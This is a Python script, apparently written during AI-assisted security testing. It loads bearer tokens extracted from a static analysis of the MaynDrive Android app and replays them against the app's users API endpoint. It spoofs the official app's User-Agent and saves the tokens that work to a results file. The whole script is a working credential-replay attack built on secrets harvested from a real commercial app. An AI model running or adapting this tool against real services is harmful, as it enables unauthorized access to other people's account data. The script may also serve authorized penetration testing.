#!/usr/bin/env python3
"""
Quick MaynDrive Token Tester for VPS
Simple command-line version for testing tokens
"""

import requests
import json
from pathlib import Path

def load_tokens():
    """Load extracted tokens from APK analysis"""
    apk_report_path = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/apk_analysis/apk_analysis_report.json"
    
    with open(apk_report_path, 'r') as f:
        data = json.load(f)
    
    tokens = data.get('extracted_secrets', {}).get('bearer_tokens', [])
    
    # Filter for potential JWT tokens
    potential_tokens = []
    for token in tokens:
        if (token.startswith('eyJ') or 
            len(token) > 50 or 
            token.startswith('MIIC')):
            potential_tokens.append(token)
    
    return potential_tokens[:10]  # Test first 10 tokens

def test_token(token, api_url):
    """Test a single token against the API"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)"
    }
    
    # Test user endpoint
    try:
        response = requests.get(f"{api_url}/api/application/users", 
                              headers=headers, timeout=10)
        
        if response.status_code == 200:
            return {"success": True, "status_code": response.status_code, "data": response.json()}
        else:
            return {"success": False, "status_code": response.status_code, "error": response.text}
    except Exception as e:
        return {"success": False, "error": str(e)}

def main():
    """Main testing function"""
    print("🧪 Quick MaynDrive Token Tester")
    print("=" * 40)
    
    # Get API URL from user
    api_url = input("Enter your test API base URL: ").strip()
    if not api_url:
        print("❌ API URL required")
        return
    
    # Load tokens
    print("🔍 Loading tokens...")
    tokens = load_tokens()
    print(f"✅ Found {len(tokens)} tokens to test")
    
    # Test tokens
    print(f"\n🎯 Testing against: {api_url}")
    print("=" * 40)
    
    valid_tokens = []
    
    for i, token in enumerate(tokens, 1):
        print(f"\n🔑 Testing Token {i}: {token[:30]}...")
        
        result = test_token(token, api_url)
        
        if result["success"]:
            print(f"   ✅ SUCCESS: Status {result['status_code']}")
            print(f"   📊 Data: {str(result['data'])[:100]}...")
            valid_tokens.append(token)
        else:
            error = result.get('error', result.get('status_code'))
            print(f"   ❌ FAILED: {error}")
    
    # Summary
    print("\n" + "=" * 40)
    print("📊 TESTING SUMMARY")
    print("=" * 40)
    print(f"🎯 API URL: {api_url}")
    print(f"🔍 Tokens Tested: {len(tokens)}")
    print(f"✅ Valid Tokens: {len(valid_tokens)}")
    
    if valid_tokens:
        print("\n🚨 VULNERABILITY CONFIRMED!")
        print("Valid tokens found that can access the API:")
        for i, token in enumerate(valid_tokens, 1):
            print(f"   {i}. {token[:50]}...")
    else:
        print("\n✅ No valid tokens found")
    
    # Save results
    results = {
        "api_url": api_url,
        "tokens_tested": len(tokens),
        "valid_tokens": len(valid_tokens),
        "vulnerability_confirmed": len(valid_tokens) > 0,
        "valid_token_list": valid_tokens
    }
    
    output_file = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/quick_test_results.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n📁 Results saved to: {output_file}")

if __name__ == "__main__":
    main()
